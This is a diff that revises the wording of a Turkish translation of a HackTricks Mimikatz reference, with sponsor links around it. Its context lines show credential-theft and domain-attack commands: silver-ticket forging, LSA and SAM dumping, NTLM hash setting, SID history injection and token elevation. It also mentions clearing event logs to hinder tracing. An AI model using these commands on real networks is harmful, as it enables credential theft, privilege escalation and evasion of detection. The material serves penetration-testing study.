@@ -9,7 +9,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
@@ -17,7 +17,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 
 <figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-**Mobil Güvenlik** alanındaki uzmanlığınızı 8kSec Akademisi ile derinleştirin. Kendi hızınızda ilerleyerek iOS ve Android güvenliğini öğrenin ve sertifika kazanın:
+**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademisi ile derinleştirin. Kendi hızınıza uygun kurslarımızla iOS ve Android güvenliğini öğrenin ve sertifika kazanın:
 
 {% embed url="https://academy.8ksec.io/" %}
 
@@ -28,11 +28,11 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 
 Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgisi hırsızlığına karşı önemli önlemler alınmıştır:
 
-- **LM hash'leri ve düz metin şifreleri** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmamasını sağlamak için _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarı, `0` DWORD değeri ile yapılandırılmalıdır.
+- **LM hash'leri ve düz metin şifreler** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmamasını sağlamak için _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarının DWORD değeri `0` olarak yapılandırılması gerekmektedir.
 
 - **LSA Koruması**, Yerel Güvenlik Otoritesi (LSA) sürecini yetkisiz bellek okuma ve kod enjeksiyonuna karşı korumak için tanıtılmıştır. Bu, LSASS'in korunan bir süreç olarak işaretlenmesiyle sağlanır. LSA Korumasının etkinleştirilmesi şunları içerir:
 1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterini değiştirerek `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
-2. Bu kayıt defteri değişikliğini yönetilen cihazlar arasında zorunlu kılan bir Grup Politika Nesnesi (GPO) uygulamak.
+2. Yönetilen cihazlar arasında bu kayıt defteri değişikliğini zorlayan bir Grup Politika Nesnesi (GPO) uygulamak.
 
 Bu korumalara rağmen, Mimikatz gibi araçlar belirli sürücüleri kullanarak LSA Korumasını aşabilir, ancak bu tür eylemlerin olay günlüklerinde kaydedilmesi muhtemeldir.
 
@@ -56,7 +56,7 @@ Mimikatz'ta olay günlüğü manipülasyonu iki ana eylemi içerir: olay günlü
 #### Olay Günlüklerini Temizleme
 
 - **Komut**: Bu eylem, olay günlüklerini silmeyi amaçlar, böylece kötü niyetli faaliyetleri takip etmeyi zorlaştırır.
-- Mimikatz, standart belgelerinde olay günlüklerini doğrudan komut satırı aracılığıyla temizlemek için doğrudan bir komut sağlamaz. Ancak, olay günlüğü manipülasyonu genellikle belirli günlükleri temizlemek için Mimikatz dışında sistem araçları veya betikler kullanmayı içerir (örneğin, PowerShell veya Windows Olay Görüntüleyici kullanarak).
+- Mimikatz, standart belgelerinde olay günlüklerini doğrudan komut satırı aracılığıyla temizlemek için doğrudan bir komut sağlamaz. Ancak, olay günlükleri manipülasyonu genellikle belirli günlükleri temizlemek için Mimikatz dışında sistem araçları veya betikler kullanmayı içerir (örneğin, PowerShell veya Windows Olay Görüntüleyici kullanarak).
 
 #### Deneysel Özellik: Olay Hizmetini Yamama
 
@@ -99,7 +99,7 @@ Silver Ticket'lar belirli hizmetlere erişim sağlar. Ana komut ve parametreler:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Trust Ticket Creation
+### Trust Ticket Oluşturma
 
 Trust Ticket'lar, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:
 
@@ -148,7 +148,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: Bir bilgisayar hesabının şifre verilerini kullanarak bir DC'yi taklit eder.
-- *Orijinal bağlamda NetSync için özel bir komut sağlanmamıştır.*
+- *NetSync için orijinal bağlamda özel bir komut sağlanmamıştır.*
 
 - **LSADUMP::SAM**: Yerel SAM veritabanına erişim sağlar.
 - `mimikatz "lsadump::sam" exit`
@@ -159,7 +159,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SetNTLM**: Bir kullanıcı için yeni bir NTLM hash'i ayarlar.
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: güven ilişkisi kimlik doğrulama bilgilerini alır.
+- **LSADUMP::Trust**: Güven bilgilerini alır.
 - `mimikatz "lsadump::trust" exit`
 
 ### Çeşitli
@@ -187,7 +187,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **SID::add/modify**: SID ve SIDHistory'yi değiştirir.
 - Ekle: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Değiştir: *Orijinal bağlamda değiştir için özel bir komut yoktur.*
+- Değiştir: *Orijinal bağlamda değişiklik için özel bir komut yoktur.*
 
 - **TOKEN::Elevate**: Token'ları taklit eder.
 - `mimikatz "token::elevate /domainadmin" exit`
@@ -222,7 +222,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
 * **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
-* **Hacking ipuçlarını [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.**
+* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**
 
 </details>
 {% endhint %}
